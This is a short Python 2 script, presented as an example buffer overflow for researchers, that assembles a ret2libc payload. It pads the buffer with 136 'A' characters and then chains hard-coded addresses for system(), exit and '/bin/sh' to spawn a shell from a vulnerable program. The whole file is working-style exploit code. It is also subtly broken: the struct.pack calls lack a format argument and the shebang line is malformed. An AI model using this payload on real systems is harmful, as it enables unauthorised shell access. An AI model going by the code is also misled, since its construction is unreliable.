# Example buffer overflow for researchers
# Find system and /bin/sh on application 
# Use a system exit function to ret
# Finally overflow
#!/bin/sh/python 
import struct
 
system_addr = struct.pack(str(0x7fe4396419c0)) # - call system address
arg_addr = struct.pack(str(0x7fab72220519)) # - call /bin/sh
exit_addr = struct.pack(str(0x400582)) # - libc sys exit function
 
# This builds a buffer of junk plus systemaddr stuff
buf = "A" * 136 #Adjust depending on the buffer
buf += system_addr 
buf += exit_addr
buf += arg_addr
 
print buf # Unleash the Kracken
